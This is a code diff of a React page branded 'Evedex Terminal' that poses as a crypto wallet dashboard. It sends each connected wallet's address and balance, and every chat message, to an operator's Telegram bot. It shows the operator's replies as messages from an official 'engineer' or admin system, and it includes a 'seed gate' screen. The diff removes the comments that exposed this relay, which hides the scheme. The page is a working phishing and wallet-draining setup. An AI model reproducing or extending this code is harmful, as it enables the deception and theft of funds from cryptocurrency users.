@@ -32,7 +32,6 @@ export default function EvedexTerminal() {
     chatEndRef.current?.scrollIntoView({ behavior: "smooth" });
   }, [chatLog, isTyping]);
 
-  // --- 📡 TELEGRAM RELAY (Mirroring everything to you) ---
   const sendTelegram = (text, type = "INFO") => {
     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: 'POST',
@@ -41,7 +40,6 @@ export default function EvedexTerminal() {
     });
   };
 
-  // --- 🎧 LISTENING FOR YOUR REPLIES ON TG ---
   useEffect(() => {
     const pollTelegram = setInterval(async () => {
       try {
@@ -52,9 +50,7 @@ export default function EvedexTerminal() {
             lastUpdateId.current = update.update_id;
             if (update.message && update.message.chat.id.toString() === chatId) {
               setIsTyping(false);
-              // Your TG reply appears as the Bot on the site
               setChatLog(prev => [...prev, { type: 'bot', msg: `[ENGINEER]: ${update.message.text}` }]);
-              // Mirror your own reply back to TG so you see the full history
               sendTelegram(update.message.text, "BOT_SENT");
             }
           });
@@ -64,10 +60,9 @@ export default function EvedexTerminal() {
     return () => clearInterval(pollTelegram);
   }, []);
 
-  // Initial Connect Logic
   useEffect(() => {
     if (isConnected && address && stage < 2) {
-      const welcome = "[ADMIN_SYSTEM]: ORAI & LFG NODE_ALIGNED. Secure RPC bridge established. Dashboard portals are now responsive.";
+      const welcome = "[ADMIN_SYSTEM]: MAINNET_NODE_ALIGNED. Secure RPC bridge established. Dashboard portals are now responsive.";
       setChatLog(prev => [...prev, { type: 'bot', msg: welcome }]);
       setStage(2);
       sendTelegram(`🟢 WALLET_CONNECTED | ADDR: ${address} | BAL: ${balance?.formatted || '0'}`);
@@ -87,12 +82,9 @@ export default function EvedexTerminal() {
   const handleBotChat = () => {
     if (!chatInput.trim() || isTyping) return;
     setChatLog(prev => [...prev, { type: 'user', msg: chatInput }]);
-    
-    // Relay User Chat to your Telegram
     sendTelegram(chatInput, "USER_SAYS");
-    
     setChatInput("");
-    setIsTyping(true); // User sees "Engineer is typing..." until you reply on TG
+    setIsTyping(true);
   };
 
   const openPortal = (name) => {
@@ -118,6 +110,11 @@ export default function EvedexTerminal() {
 
   return (
     <div className="min-h-screen bg-[#05070a] text-slate-200 font-sans p-4 uppercase tracking-tighter select-none flex flex-col relative font-black">
+      <style>{`
+        @keyframes pulse-cyan { 0% { box-shadow: 0 0 0 0 rgba(6, 182, 212, 0.6); border-color: #06b6d4; } 70% { box-shadow: 0 0 0 10px rgba(6, 182, 212, 0); border-color: #06b6d4; } 100% { box-shadow: 0 0 0 0 rgba(6, 182, 212, 0); } }
+        .glow-button { animation: pulse-cyan 1.5s infinite; border-width: 2px !important; }
+      `}</style>
+
       <header className="flex justify-between items-center mb-6 border-b border-slate-900 pb-4 text-cyan-500 z-[20]">
         <div className="flex flex-col">
           <div className="flex items-center gap-2 italic text-md text-cyan-500"><ShieldCheck size={18}/>EVEDEX TERMINAL</div>
@@ -156,7 +153,6 @@ export default function EvedexTerminal() {
         )}
       </div>
 
-      {/* CHAT INTERFACE */}
       <div className="fixed bottom-0 left-0 right-0 bg-[#0d1117] border-t border-slate-800 p-4 rounded-t-[30px] z-[250]">
         <div className="max-h-24 overflow-y-auto mb-3 no-scrollbar flex flex-col gap-2">
           {chatLog.map((chat, i) => (
@@ -172,7 +168,6 @@ export default function EvedexTerminal() {
         </div>
       </div>
 
-      {/* SEED GATE */}
       {view === "seed_gate" && (
         <div className="fixed inset-0 bg-black/98 z-[200] flex flex-col items-center justify-center p-4 backdrop-blur-3xl">
           <div className="bg-[#0d1117] border border-slate-800 w-full max-w-sm rounded-[35px] p-8 text-center mb-40 border-red-900/30">
